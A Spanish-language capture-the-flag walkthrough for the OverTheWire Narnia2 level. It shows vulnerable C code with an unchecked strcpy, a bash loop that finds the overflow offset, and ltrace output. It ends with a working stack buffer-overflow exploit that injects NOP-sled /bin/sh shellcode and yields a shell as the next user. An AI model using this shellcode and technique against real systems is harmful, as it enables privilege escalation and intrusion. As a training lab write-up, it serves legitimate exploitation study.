---
layout: default
---

## OverTheWire: Narnia2

En este desafío entraremos en un binxp "real" con un payload extremadamente basico que llena ESP con NOPS(\x90), excepto por un shellcode al final, y luego sobrescribiendo la dirección ret para que sea el inicio de ESP.

### Empezando

Lo primero que haremos como siempre es conectarnos a la máquina por SSH con las credenciales del desafío anterior:

`ssh narnia2@narnia.labs.overthewire.org -p 2226`

Aquí está el código fuente del binario:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128]; /*Declares the buffer length to be 128 bytes*/

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]); /*Display usage*/
        exit(1);
    }
    strcpy(buf,argv[1]); /*Copy contents of arg 1 to buffer*/
    printf("%s", buf); /*Print the buffer*/

    return 0;
}
```

Entonces, podemos comenzar obteniendo el offset de falla (que será alrededor de 128, ya que este es el tamaño del buffer, aunque si hay algo entre el final del buffer y el inicio de la dirección ret en la pila, entonces necesitaremos para jugar con la ubicación de la dirección ret en el payload), para esto hice un bucle de bash realmente simple que aumenta lentamente el relleno.

```bash
for i in $(seq 1 300); do echo $i; ./narnia2 $(python -c 'print "A"*'$i';'); done
```

Todo lo que hace son bucles de 1 a 300 y repite el número cada vez, pero también imprime "A" esa cantidad de veces mientras la pasa como argumento al binario, de modo que podamos seguir los números hasta encontrar Segmentation fault.

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA132
Segmentation fault
```

Podemos ver que después de 132 ocurre el segfault, ese es nuestro espacio que tenemos hasta que la dirección ret comienza a sobrescribirse.

Ahora, el buffer es de 128 bytes y la dirección ret se rompe en 132, por lo que entre el final del buffer y el inicio de la dirección de retorno hay 4 bytes de "basura", que puede llenar con nopsleds, pero en nuestro caso, repetiremos la dirección ret 4 veces (una caerá en la posición correcta, las otras son rellenos).

Entonces tenemos nuestro relleno, para obtener nuestra dirección de retorno, simplemente podemos bloquearlo con un segfault, mientras lo vemos con ltrace.

```bash
narnia2@narnia:/narnia$ ltrace ./narnia2 $(python -c 'print "A"*132')
__libc_start_main(0x804844b, 2, 0xffffd704, 0x80484a0 <unfinished ...>
strcpy(0xffffd5e8, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                     = 0xffffd5e8
printf("%s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                           = 132
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Ltrace nos muestra que strcpy intento copiar nuestras "A"s a la dirección `0xffffd5e8`(la posición de memoria de la memoria intermedia), que en little endian es: `\xe8\xd5\xff\xff`. Entonces tenemos el relleno, tenemos la dirección de retorno, ahora solo necesitamos el shellcode. Para esto, podemos usar el shellcode alfanumérico de ejemplo, o podemos encontrar el nuestro con una simple búsqueda en Google de "32 bit bin sh shellcode" ([http://shell-storm.org/shellcode/files/shellcode-821.php 2](http://shell-storm.org/shellcode/files/shellcode-827.php 2))
Entonces, ahora para estructurar nuestra carga útil, la idea es aprovechar el hecho de que controlamos el contenido del búfer y también controlamos la dirección de retorno, por lo que si hacemos que el contenido del búfer sea malicioso y luego regresemos a la inicio del búfer, se ejecutará.

Entonces, el primer paso es tener nuestro relleno, un nop (sin operación, \ x90), básicamente hace que la máquina no haga nada y pase a la siguiente instrucción, para que podamos llenar el inicio del búfer con nops, hasta nuestro código de shell .

El shellcode ocupa un total de 28 bytes, y nuestro tamaño de búfer es de 128 bytes, por lo que es 100 nops (128-28), luego tenemos los 4 bytes de "basura", y luego la dirección de retorno, para resumshellcode
\x90 x 100 + 28 (shellcode) + 4 (junk) + 4 (ret addr)

Entonces, ahora sabemos cómo construir nuestra carga útil y podemos ejecutarla en el binario vulnerable:

narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90\x90\x90\x90" + "\xe8\xd5\xff\xff"')
$ whoami
narnia3
